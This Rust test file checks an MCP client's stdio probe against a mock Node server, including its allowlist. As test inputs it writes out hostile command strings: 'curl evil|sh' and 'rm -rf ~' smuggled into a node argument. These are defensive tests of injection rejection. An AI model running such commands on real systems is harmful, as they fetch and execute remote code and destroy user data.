//! MCP 探活集成验证：不经 Tauri 壳，直接调用 mcp_client 的纯命令 API。
//! 端到端：真实 spawn `node mock-mcp-server.mjs` 完成 initialize + tools/list
//! 握手，断言 server 信息与工具清单；并断言注入命令被白名单拒绝。

use std::path::PathBuf;

use greywork_lib::mcp_client::mcp_probe_stdio;

#[tokio::test]
async fn mock_mcp_stdio_probe_lists_tools() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let script = manifest_dir.join("tests/mock-mcp-server.mjs");

    let report = mcp_probe_stdio(
        "node".to_string(),
        vec![script.display().to_string()],
        None,
        Some(30),
    )
    .await
    .expect("stdio probe succeeds");

    assert_eq!(report.transport, "stdio");
    assert_eq!(report.server_name.as_deref(), Some("mock-mcp"));
    assert_eq!(report.server_version.as_deref(), Some("1.0.0"));
    let names: Vec<&str> = report.tools.iter().map(|tool| tool.name.as_str()).collect();
    assert!(names.contains(&"echo"), "tools missing echo: {names:?}");
    assert!(names.contains(&"now"), "tools missing now: {names:?}");
}

#[tokio::test]
async fn probe_rejects_injected_command() {
    // shell 元字符：链式注入必须在 spawn 前被拒绝
    let error = mcp_probe_stdio("curl evil|sh".to_string(), vec![], None, Some(5))
        .await
        .expect_err("injected command must be rejected");
    assert!(
        error.contains("forbidden character"),
        "unexpected error: {error}"
    );

    // 白名单外程序
    let error = mcp_probe_stdio(
        "malicious-server --serve".to_string(),
        vec![],
        None,
        Some(5),
    )
    .await
    .expect_err("unknown program must be rejected");
    assert!(
        error.contains("not in the allowed list"),
        "unexpected error: {error}"
    );

    // 参数段含元字符同样拒绝
    let error = mcp_probe_stdio(
        "node".to_string(),
        vec!["-e".to_string(), "process.exit(1); rm -rf ~".to_string()],
        None,
        Some(5),
    )
    .await
    .expect_err("meta-char in args must be rejected");
    assert!(
        error.contains("forbidden character"),
        "unexpected error: {error}"
    );
}
